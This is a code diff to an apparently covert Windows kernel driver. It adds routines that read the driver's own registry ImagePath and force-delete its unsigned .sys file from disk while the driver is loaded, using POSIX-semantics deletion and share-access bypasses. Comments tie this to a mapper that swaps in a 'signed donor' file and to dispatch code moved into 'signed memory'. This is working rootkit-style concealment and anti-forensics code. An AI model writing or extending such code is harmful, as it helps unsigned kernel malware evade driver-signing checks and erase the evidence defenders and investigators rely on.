@@ -12,8 +12,203 @@ namespace net_capture {
     void cleanup();
 }
 
+constexpr ULONG TAG_DEL = 'leDW';
+
+// POSIX delete: FileDispositionInformationEx (class 64) with POSIX semantics
+// immediately unlinks the directory entry even when an image section is mapped
+// (which is the case for a loaded .sys — NtLoadDriver creates a SECTION_OBJECT
+// backed by the file, blocking all standard deletion methods).
+// Available on Windows 10 1607+ / NTFS.
+#ifndef FILE_DISPOSITION_FLAG_DELETE
+#define FILE_DISPOSITION_FLAG_DELETE                 0x00000001
+#endif
+#ifndef FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
+#define FILE_DISPOSITION_FLAG_POSIX_SEMANTICS       0x00000002
+#endif
+#ifndef FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE
+#define FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE 0x00000010
+#endif
+
+// FILE_DISPOSITION_INFORMATION_EX is provided by WDK's ntddk.h.
+// FileDispositionInformationEx enum value = 64.
+static constexpr FILE_INFORMATION_CLASS FileDispositionInformationExClass =
+    static_cast<FILE_INFORMATION_CLASS>(64);
+
+static BOOLEAN ForceDeleteFileByPath(PUNICODE_STRING FilePath)
+{
+    if (!FilePath || !FilePath->Buffer || !_ZwSetInformationFile)
+        return FALSE;
+
+    OBJECT_ATTRIBUTES objAttr;
+    InitializeObjectAttributes(&objAttr, FilePath,
+        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    // Tier 0 — POSIX delete via FileDispositionInformationEx.
+    // This is the only method that works on a loaded driver image because
+    // POSIX semantics unlink the directory entry immediately while the
+    // data stream stays alive until the last section reference is released.
+    // IO_IGNORE_SHARE_ACCESS_CHECK bypasses the implicit share-access
+    // conflict caused by the mapped image section.
+    if (_IoCreateFileEx) {
+        HANDLE fileHandle = NULL;
+        IO_STATUS_BLOCK ioStatus = {};
+        IO_DRIVER_CREATE_CONTEXT createCtx = {};
+        createCtx.Size = sizeof(createCtx);
+
+        NTSTATUS status = _IoCreateFileEx(
+            &fileHandle,
+            DELETE | SYNCHRONIZE,
+            &objAttr,
+            &ioStatus,
+            NULL,
+            FILE_ATTRIBUTE_NORMAL,
+            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            FILE_OPEN,
+            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+            NULL, 0,
+            CreateFileTypeNone,
+            NULL,
+            IO_IGNORE_SHARE_ACCESS_CHECK,
+            &createCtx
+        );
+
+        if (NT_SUCCESS(status)) {
+            FILE_DISPOSITION_INFORMATION_EX dispEx = {};
+            dispEx.Flags = FILE_DISPOSITION_FLAG_DELETE
+                         | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
+                         | FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE;
+
+            status = _ZwSetInformationFile(
+                fileHandle, &ioStatus,
+                &dispEx, sizeof(dispEx),
+                FileDispositionInformationExClass
+            );
+            _ZwClose(fileHandle);
+
+            if (NT_SUCCESS(status))
+                return TRUE;
+        }
+    }
+
+    // Tier 1 — Direct ZwDeleteFile (works only if no image section is mapped)
+    if (_ZwDeleteFile) {
+        NTSTATUS st = _ZwDeleteFile(&objAttr);
+        if (NT_SUCCESS(st))
+            return TRUE;
+    }
+
+    // Tier 2 — IoCreateFileEx with FILE_DELETE_ON_CLOSE
+    HANDLE fileHandle = NULL;
+    IO_STATUS_BLOCK ioStatus = {};
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+
+    if (_IoCreateFileEx) {
+        IO_DRIVER_CREATE_CONTEXT createCtx = {};
+        createCtx.Size = sizeof(createCtx);
+        status = _IoCreateFileEx(
+            &fileHandle,
+            DELETE | SYNCHRONIZE,
+            &objAttr,
+            &ioStatus,
+            NULL,
+            FILE_ATTRIBUTE_NORMAL,
+            0,
+            FILE_OPEN,
+            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE,
+            NULL, 0,
+            CreateFileTypeNone,
+            NULL,
+            IO_IGNORE_SHARE_ACCESS_CHECK,
+            &createCtx
+        );
+    }
+
+    if (!NT_SUCCESS(status)) {
+        // Tier 3 — Standard ZwCreateFile with delete share
+        status = ZwCreateFile(
+            &fileHandle,
+            DELETE | SYNCHRONIZE,
+            &objAttr,
+            &ioStatus,
+            NULL,
+            FILE_ATTRIBUTE_NORMAL,
+            FILE_SHARE_DELETE,
+            FILE_OPEN,
+            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+            NULL, 0
+        );
+    }
+
+    if (!NT_SUCCESS(status))
+        return FALSE;
+
+    // Set disposition to delete on close
+    FILE_DISPOSITION_INFORMATION dispInfo = {};
+    dispInfo.DeleteFile = TRUE;
+    status = _ZwSetInformationFile(
+        fileHandle, &ioStatus,
+        &dispInfo, sizeof(dispInfo),
+        FileDispositionInformation
+    );
+
+    _ZwClose(fileHandle);
+    return NT_SUCCESS(status);
+}
+
+static VOID DeleteDriverOnDisk(PUNICODE_STRING RegistryPath)
+{
+    if (!RegistryPath || !RegistryPath->Buffer)
+        return;
+
+    if (!_ZwOpenKey || !_ZwQueryValueKey || !_ZwClose)
+        return;
+
+    OBJECT_ATTRIBUTES keyAttr;
+    InitializeObjectAttributes(&keyAttr, RegistryPath,
+        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    HANDLE keyHandle = NULL;
+    NTSTATUS status = _ZwOpenKey(&keyHandle, KEY_READ, &keyAttr);
+    if (!NT_SUCCESS(status))
+        return;
+
+    UNICODE_STRING valueName;
+    _RtlInitUnicodeString(&valueName, L"ImagePath");
+
+    ULONG kvSize = 0;
+    status = _ZwQueryValueKey(keyHandle, &valueName,
+        KeyValuePartialInformation, NULL, 0, &kvSize);
+    if (status != STATUS_BUFFER_TOO_SMALL && status != STATUS_BUFFER_OVERFLOW) {
+        _ZwClose(keyHandle);
+        return;
+    }
+
+    auto kvInfo = static_cast<PKEY_VALUE_PARTIAL_INFORMATION>(
+        ExAllocatePoolWithTag(NonPagedPool, kvSize, TAG_DEL));
+    if (!kvInfo) {
+        _ZwClose(keyHandle);
+        return;
+    }
+
+    status = _ZwQueryValueKey(keyHandle, &valueName,
+        KeyValuePartialInformation, kvInfo, kvSize, &kvSize);
+    _ZwClose(keyHandle);
+
+    if (!NT_SUCCESS(status) ||
+        (kvInfo->Type != REG_SZ && kvInfo->Type != REG_EXPAND_SZ)) {
+        ExFreePoolWithTag(kvInfo, TAG_DEL);
+        return;
+    }
+
+    UNICODE_STRING imagePath;
+    _RtlInitUnicodeString(&imagePath, reinterpret_cast<PCWSTR>(kvInfo->Data));
+
+    ForceDeleteFileByPath(&imagePath);
+
+    ExFreePoolWithTag(kvInfo, TAG_DEL);
+}
+
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
-    UNREFERENCED_PARAMETER(RegistryPath);
 
 
     if (!SetupFunctions()) {
@@ -88,6 +283,9 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
         signed_memory::RelocateDispatchToSignedMemory(DriverObject, 0x800);
     }
 
+    // Delete our unsigned binary from disk — registry ImagePath still points to
+    // the target file at this point (mapper swaps to signed donor AFTER NtLoadDriver returns)
+    DeleteDriverOnDisk(RegistryPath);
 
     return STATUS_SUCCESS;
 }
